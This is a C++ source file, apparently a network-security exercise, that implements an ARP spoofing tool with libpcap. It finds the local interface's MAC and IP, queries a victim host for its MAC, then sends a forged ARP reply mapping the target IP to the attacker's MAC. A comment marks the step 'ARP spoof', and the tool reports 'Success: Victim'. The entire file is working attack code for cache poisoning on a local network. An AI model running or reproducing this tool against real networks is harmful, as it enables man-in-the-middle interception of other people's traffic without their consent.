#include "send_arp.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct s_info {
	Mac	mac;
	Ip	ip;
}	t_info;

int	getAttackerInfo(t_info *attacker, char *dev)
{
	struct ifreq	data;
   	int				fd;
	
	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(data.ifr_name, dev);
    if (!ioctl(fd, SIOCGIFHWADDR, &data))
		attacker->mac = Mac((uint8_t *)data.ifr_hwaddr.sa_data);
	else
		return (1);
	if (!ioctl(fd, SIOCGIFADDR, &data))
		attacker->ip = Ip(ntohl(((struct sockaddr_in*)&data.ifr_addr)->sin_addr.s_addr));
	else
		return (1);
	printf("[INFO] Attacker's mac addr: [%s]\n", std::string(attacker->mac).data());
	printf("[INFO] Attacker's ip addr: [%s]\n", std::string(attacker->ip).data());
	close(fd);
	return (0);
}

int	SendARPPacket(pcap *handle, int mode, Mac eth_smac, Mac eth_dmac, t_info arp_sender, t_info arp_target)
{
	EthArpPacket	packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (mode)
		packet.arp_.op_ = htons(ArpHdr::Reply);
	else
		packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = arp_sender.mac;
	packet.arp_.sip_ = htonl(arp_sender.ip);
	packet.arp_.tmac_ = arp_target.mac;
	packet.arp_.tip_ = htonl(arp_target.ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res) {
		fprintf(stderr, "Error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return (1);
	}
	return (0);
}

int	getSenderMac(pcap *handle, t_info *Attacker, t_info *Sender)
{
	t_info	target;

	target.mac = Mac("00:00:00:00:00:00");
	target.ip = Sender->ip;
	if (SendARPPacket(handle, 0, Attacker->mac, Mac("FF:FF:FF:FF:FF:FF"), *Attacker, target))
		return (1);
	struct pcap_pkthdr	*header;
	const u_char		*packet;

	while (1) // recv
	{
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) return (1);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "Error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return (1);
		}
		if (((EthHdr *)packet)->type() != ((EthHdr *)packet)->Arp) // Check packet is ARP
			continue ;
		EthArpPacket	*respacket = (EthArpPacket *)packet;
		if (respacket->eth_.dmac() == Attacker->mac && respacket->arp_.sip() == Sender->ip && respacket->arp_.tmac() == Attacker->mac && respacket->arp_.tip() == Attacker->ip) // check this packet is reply for My sendpacket
		{
			Sender->mac = respacket->eth_.smac();
			printf("[INFO] Sender's mac addr: [%s]\n", std::string(Sender->mac).data());
			return (0);
		}
	}
}

int	main(int argc, char *argv[])
{
	if (argc < 4 || argc % 2)
	{
		fprintf(stderr, "Usage: %s <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n", argv[0]);
		return (1);
	}
	t_info	Attacker, Sender, Target;
	char	*dev = argv[1];
	char	errbuf[PCAP_ERRBUF_SIZE];
	
	if (getAttackerInfo(&Attacker, dev))
	{
		fprintf(stderr, "Error: get Attackers MAC & IP\n");
		return (1);
	}
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (!handle)
	{
		fprintf(stderr, "Error: Couldn't open device %s(%s)\n", dev, errbuf);
		return (1);
	}
	for (int i = 2; i < argc; i+=2)
	{
		Sender.ip = Ip(argv[i]);
		Target.ip = Ip(argv[i + 1]);
		
		if (getSenderMac(handle, &Attacker, &Sender))
		{
			pcap_close(handle);
			return (1);
		}
		Target.mac = Attacker.mac; // ARP spoof
		if (SendARPPacket(handle, 1, Attacker.mac, Sender.mac, Target, Sender))
		{
			pcap_close(handle);
			return (1);
		}
		printf("Success: Victim: %s, Target: %s\n", std::string(Sender.ip).data(), std::string(Target.ip).data());
	}
	pcap_close(handle);
	return (0);
}
